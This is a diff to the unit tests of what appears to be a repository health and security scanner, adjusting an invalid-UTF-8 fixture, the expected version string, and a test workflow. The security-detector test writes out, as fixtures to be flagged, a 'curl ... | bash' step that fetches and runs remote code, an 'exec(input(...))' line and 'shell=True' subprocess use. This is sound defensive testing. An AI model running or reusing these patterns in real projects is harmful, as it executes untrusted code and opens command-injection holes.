@@ -81,7 +81,7 @@ class OneHealthScannerTests(unittest.TestCase):
 
     def test_invalid_utf8_text_file_is_reported(self):
         path = self.root / "docs" / "broken.md"
-        path.write_bytes(b"# title\n\\xff")
+        path.write_bytes(b"# title\n\xff")
         report = scan_repository(self.root)
         finding = next(f for f in report["findings"] if f["rule_id"] == "unreadable-text-file")
         self.assertEqual("docs/broken.md", finding["path"])
@@ -303,7 +303,7 @@ class OneHealthScannerTests(unittest.TestCase):
 
     def test_report_records_scanner_and_runtime_environment(self):
         report = scan_repository(self.root)
-        self.assertEqual("0.1.0", report["scanner_version"])
+        self.assertEqual("0.1.2", report["scanner_version"])
         self.assertTrue(report["environment"]["python"])
         self.assertIn(report["environment"]["platform"], {"Linux", "Windows", "Darwin", "FreeBSD", "OpenBSD", "NetBSD"})
         self.assertIn(report["working_tree"]["state"], {"clean", "dirty_or_unavailable"})
@@ -380,7 +380,7 @@ class OneHealthScannerTests(unittest.TestCase):
     def test_security_detector_flags_suspicious_code_and_workflow_patterns(self):
         code = "exec" + "(input" + "('command'))"
         self.write("unsafe.py", code + "\nsubprocess.run(command, shell=True)\n")
-        workflow = "name: unsafe\npermissions:\n  write-all\nsteps:\n  - uses: vendor/action@main\n  - run: curl https://example.invalid/script.sh | bash\n"
+        workflow = "name: unsafe\npermissions: write-all\nsteps:\n  - uses: vendor/action@main\n  - run: curl https://example.invalid/script.sh | bash\n"
         self.write(".github/workflows/unsafe.yml", workflow)
         report = scan_repository(self.root)
         rules = {f["rule_id"] for f in report["findings"]}
